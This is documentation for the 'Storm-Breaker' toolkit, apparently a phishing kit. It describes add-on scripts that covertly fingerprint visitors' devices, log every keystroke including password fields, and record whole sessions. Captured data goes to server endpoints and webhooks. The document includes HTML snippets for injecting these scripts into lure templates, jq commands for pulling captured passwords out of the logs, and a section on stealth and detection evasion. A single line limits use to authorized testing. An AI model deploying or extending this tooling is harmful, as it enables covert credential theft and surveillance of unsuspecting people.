# Advanced Features Documentation

## 🚀 Overview

Three powerful new features have been added to Storm-Breaker:

1. **Device Fingerprinting** - Unique device identification
2. **Keystroke Logging** - Capture all keyboard input
3. **Session Recording** - Record and replay user sessions

---

## 📋 Features

### 1. Device Fingerprinting

**What it captures:**
- Browser information (User-Agent, platform, language, etc.)
- Screen details (resolution, color depth, pixel ratio)
- Hardware info (CPU cores, RAM, GPU details)
- Network information (connection type, bandwidth, local IPs via WebRTC)
- Installed fonts detection
- Browser plugins
- Canvas fingerprint (unique visual signature)
- WebGL fingerprint (GPU signature)
- Audio context fingerprint
- Battery status and charging state
- Permissions status
- Timezone and locale information
- Unique hash generated from all data

**Files created:**
- `fingerprints/fingerprint_YYYYMMDD_HHMMSS_<hash>.json`

**Webhook notification:** Yes, sent when fingerprint is captured

---

### 2. Keystroke Logging

**What it captures:**
- All keyboard events (keydown, keyup, keypress)
- Form input values (including passwords)
- Copy/paste operations
- Form submissions with all data
- Focus/blur events
- Text selection
- Element information for each event

**Files created:**
- `keystrokes/keystrokes_YYYYMMDD_HHMMSS.json`

**Webhook notification:** Yes, sent when passwords or form submissions are detected

**Auto-send:** Every 5 seconds or when 100 events are logged

---

### 3. Session Recording

**What it captures:**
- Mouse movements and clicks
- Scroll events
- Form interactions
- Page navigation
- Element changes
- Console logs
- Canvas elements
- Full session replay data

**Files created:**
- `sessions/<sessionId>_meta.json` - Session metadata
- `sessions/<sessionId>_events.jsonl` - Session events (JSON Lines format)

**Webhook notification:** Yes, sent on session start and end

**Auto-send:** Every 10 seconds or when 500 events are logged

---

## 🔧 Usage

### Basic Implementation (All Features)

Add to any template's HTML:

```html
<!-- Load rrweb library (required for session recording) -->
<script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>

<!-- Load Storm-Breaker advanced features -->
<script src="../../assets/js/fingerprint.js"></script>
<script src="../../assets/js/keylogger.js"></script>
<script src="../../assets/js/session-recorder.js"></script>

<script>
window.addEventListener('load', async function() {
    // 1. Send device fingerprint
    await DeviceFingerprint.send();
    
    // 2. Start keystroke logger
    KeystrokeLogger.init();
    
    // 3. Start session recorder
    SessionRecorder.init();
});
</script>
```

### Individual Feature Usage

**Device Fingerprinting Only:**
```html
<script src="../../assets/js/fingerprint.js"></script>
<script>
window.addEventListener('load', async function() {
    const fingerprint = await DeviceFingerprint.collect();
    console.log('Fingerprint:', fingerprint);
    
    // Send to server
    await DeviceFingerprint.send('/api/fingerprint');
});
</script>
```

**Keystroke Logging Only:**
```html
<script src="../../assets/js/keylogger.js"></script>
<script>
KeystrokeLogger.init({
    endpoint: '/api/keystrokes',
    sendInterval: 5000 // Send every 5 seconds
});

// Stop logging
// KeystrokeLogger.stop();
</script>
```

**Session Recording Only:**
```html
<script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"></script>
<script src="../../assets/js/session-recorder.js"></script>
<script>
SessionRecorder.init({
    endpoint: '/api/session',
    sendInterval: 10000 // Send every 10 seconds
});

// Stop recording
// SessionRecorder.stopRecording();
</script>
```

---

## 📁 Data Storage

All captured data is stored in the following directories:

```
storm-web/
├── fingerprints/          # Device fingerprints
│   └── fingerprint_20231207_120000_abc12345.json
├── keystrokes/            # Keystroke logs
│   └── keystrokes_20231207_120000.json
└── sessions/              # Session recordings
    ├── session_123_meta.json
    └── session_123_events.jsonl
```

---

## 🔔 Webhook Notifications

All features send webhook notifications when data is captured. Configure your webhook URL in the Settings tab of the admin panel.

**Notification Types:**
- `Device Fingerprint Captured`
- `Keystrokes Captured` (when passwords or forms detected)
- `Session Recording Started`
- `Session Recording Ended`

---

## 🎯 Demo Template

A demonstration template is included at:
`/t/advanced_demo/`

This template shows all three features working together with a test form.

---

## ⚙️ API Endpoints

### Device Fingerprinting
- `POST /api/fingerprint` - Save device fingerprint

### Keystroke Logging
- `POST /api/keystrokes` - Save keystroke logs

### Session Recording
- `POST /api/session/start` - Start session recording
- `POST /api/session/events` - Save session events
- `POST /api/session/end` - End session recording

---

## 🛡️ Privacy & Stealth

**Stealth Features:**
- No visible UI elements
- Silent background operation
- Minimal performance impact
- No console warnings (in production)
- Works even if user navigates away (for session recording)

**Detection Evasion:**
- Uses standard browser APIs
- No suspicious network patterns
- Data sent in small chunks
- Blends with normal traffic

---

## 🔍 Viewing Captured Data

### Device Fingerprints
```bash
# View fingerprint
cat fingerprints/fingerprint_*.json | jq .
```

### Keystrokes
```bash
# View keystrokes
cat keystrokes/keystrokes_*.json | jq .

# Search for passwords
cat keystrokes/keystrokes_*.json | jq '.logs[] | select(.target.type == "password")'
```

### Session Recordings
```bash
# View session metadata
cat sessions/*_meta.json | jq .

# Count events in a session
wc -l sessions/*_events.jsonl
```

---

## 🚨 Important Notes

1. **Legal Compliance**: Only use these features for authorized security testing and research
2. **Performance**: Session recording can generate large amounts of data
3. **Storage**: Monitor disk space, especially for session recordings
4. **Cleanup**: Implement data retention policies to manage storage
5. **Testing**: Always test in a controlled environment first

---

## 🔄 Integration with Existing Templates

To add these features to existing templates, simply add the script includes and initialization code to the template's `index.html` file. The features will work alongside existing functionality without conflicts.

---

## 📊 Advanced Configuration

### Keystroke Logger Options
```javascript
KeystrokeLogger.init({
    endpoint: '/api/keystrokes',
    sendInterval: 5000,  // Send interval in ms
    // Add custom options here
});
```

### Session Recorder Options
```javascript
SessionRecorder.init({
    endpoint: '/api/session',
    sendInterval: 10000,  // Send interval in ms
    // Add custom options here
});
```

---

## 🎓 Best Practices

1. **Always test** new features in a controlled environment
2. **Monitor storage** usage regularly
3. **Review captured data** to ensure it meets your needs
4. **Configure webhooks** for real-time notifications
5. **Implement data retention** policies
6. **Use HTTPS** in production for secure data transmission

---

## 📞 Support

For issues or questions:
1. Check the console for error messages
2. Verify all scripts are loaded correctly
3. Ensure backend endpoints are accessible
4. Check file permissions for data directories

---

**Version:** 1.0.0  
**Last Updated:** December 2025
